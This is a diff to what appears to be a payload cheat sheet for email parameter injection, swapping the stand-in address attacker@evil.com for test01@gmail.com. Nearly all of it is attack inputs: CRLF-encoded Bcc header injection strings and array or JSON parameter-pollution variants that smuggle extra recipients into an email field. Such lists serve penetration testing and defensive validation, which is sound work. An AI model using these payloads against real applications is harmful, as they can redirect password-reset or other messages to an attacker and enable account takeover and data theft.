@@ -10,13 +10,13 @@ email=test@gmail.com|test01@gmail.com
 email=test@gmail.com,test01@gmail.com
 email=test@gmail.com;test01@gmail.com
 email[]=test@gmail.com&email[]=test01@gmail.com
-email=test@gmail.com%0ABcc:attacker@evil.com
-email=test@gmail.com%0Ato:admin@target.com%0ABcc:attacker@evil.com
-email=test@gmail.com%0D%0ABcc:attacker@evil.com
+email=test@gmail.com%0ABcc:test01@gmail.com
+email=test@gmail.com%0Ato:test01@gmail.com%0ABcc:test01@gmail.com
+email=test@gmail.com%0D%0ABcc:test01@gmail.com
 bcc:email=test@gmail.com
 bcc=email=test@gmail.com
-bcc[0]=test@gmail.com&bcc[1]=attacker@evil.com
-bcc="test@gmail.com\r\nBcc:attacker@evil.com"
+bcc[0]=test@gmail.com&bcc[1]=test01@gmail.com
+bcc="test@gmail.com\r\nBcc:test01@gmail.com"
 ```
 
 ---
@@ -25,15 +25,15 @@ bcc="test@gmail.com\r\nBcc:attacker@evil.com"
 
 ```json
 {"email": "test@gmail.com"}
-{"email": ["test@gmail.com", "attacker@evil.com"]}
-{"email": ["test@gmail.com", {"email": "attacker@evil.com"}]}
+{"email": ["test@gmail.com", "test01@gmail.com"]}
+{"email": ["test@gmail.com", {"email": "test01@gmail.com"}]}
 {"bcc":"test@gmail.com"}
-{"to":"test@gmail.com", "bcc":"attacker@evil.com"}
-{"email":"test@gmail.com\r\nBcc:attacker@evil.com"}
-{"email":"test@gmail.com\nBcc:evil@evil.com"}
-{"email[0]":"test@gmail.com", "email[1]":"attacker@evil.com"}
-{"email":"test@gmail.com", "email.extra":"attacker@evil.com"}
-{"email":{"0":"test@gmail.com","1":"attacker@evil.com"}}
+{"to":"test@gmail.com", "bcc":"test01@gmail.com"}
+{"email":"test@gmail.com\r\nBcc:test01@gmail.com"}
+{"email":"test@gmail.com\nBcc:test01@gmail.com"}
+{"email[0]":"test@gmail.com", "email[1]":"test01@gmail.com"}
+{"email":"test@gmail.com", "email.extra":"test01@gmail.com"}
+{"email":{"0":"test@gmail.com","1":"test01@gmail.com"}}
 ```
 
 ---
